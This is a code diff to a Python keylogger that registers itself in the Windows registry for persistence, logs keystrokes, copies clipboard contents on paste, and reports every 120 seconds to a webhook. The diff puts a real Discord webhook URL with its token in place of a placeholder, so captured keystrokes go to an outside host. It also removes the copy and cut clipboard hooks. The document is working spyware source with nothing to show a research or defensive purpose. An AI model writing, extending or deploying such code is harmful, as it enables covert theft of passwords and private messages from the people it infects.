@@ -13,7 +13,7 @@ from pynput.keyboard import Key
 
 current_window = None
 REPORT_INTERVAL = 120
-WEBHOOK_URL = "YOUR_WEBHOOK_URL"
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1310097987753738291/enB40L7olCXuV2vg2ItGzjYIg13gkXJg68mnGf0bVfx6ZF-AVd60gDFTl1-r6LJZyyz3"
 special_keys = {
     Key.alt_l: "",
     Key.alt_r: "",
@@ -163,9 +163,8 @@ def schedule_report():
 if __name__ == "__main__":
     add_to_registry()
     start_time = datetime.now()
+    end_time = datetime.now().strftime('%d/%m/%Y %H:%M')
     keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
-    keyboard.add_hotkey("ctrl+c", copy_clipboard_data, suppress=False)
-    keyboard.add_hotkey("ctrl+x", copy_clipboard_data, suppress=False)
     with kb.Listener(on_press=on_press) as listener:
         schedule_report()
         listener.join()
